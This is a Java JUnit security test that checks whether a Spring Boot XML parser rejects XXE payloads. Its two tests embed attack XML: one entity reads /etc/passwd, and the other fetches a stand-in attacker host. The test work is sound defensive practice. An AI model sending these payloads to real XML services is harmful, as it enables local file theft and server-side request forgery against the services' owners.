package de.jobst.resulter.adapter.driver.web;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * Security tests verifying the XML parser rejects malicious XXE payloads.
 * XXE (XML External Entity) attacks can read local files or perform SSRF.
 * These tests use the production XmlConfig to verify the real configuration is secure.
 */
@SpringBootTest(classes = {XmlConfig.class, XmlParser.class})
@ActiveProfiles("nosecurity")
class XmlParserSecurityTest {

    @Autowired
    XmlParser xmlParser;

    @Test
    void parseXmlFile_rejectsDoctypeDeclaration() {
        String xxeXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>&xxe;</foo>
                """;

        assertThrows(Exception.class,
                () -> xmlParser.parseXmlFile(new ByteArrayInputStream(xxeXml.getBytes(StandardCharsets.UTF_8))),
                "Parser must reject XML with DOCTYPE declarations to prevent XXE attacks");
    }

    @Test
    void parseXmlFile_rejectsExternalEntityReference() {
        String xxeXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [
                  <!ENTITY ext SYSTEM "http://attacker.example.com/evil">
                ]>
                <root>&ext;</root>
                """;

        assertThrows(Exception.class,
                () -> xmlParser.parseXmlFile(new ByteArrayInputStream(xxeXml.getBytes(StandardCharsets.UTF_8))),
                "Parser must reject XML with external entity references");
    }
}
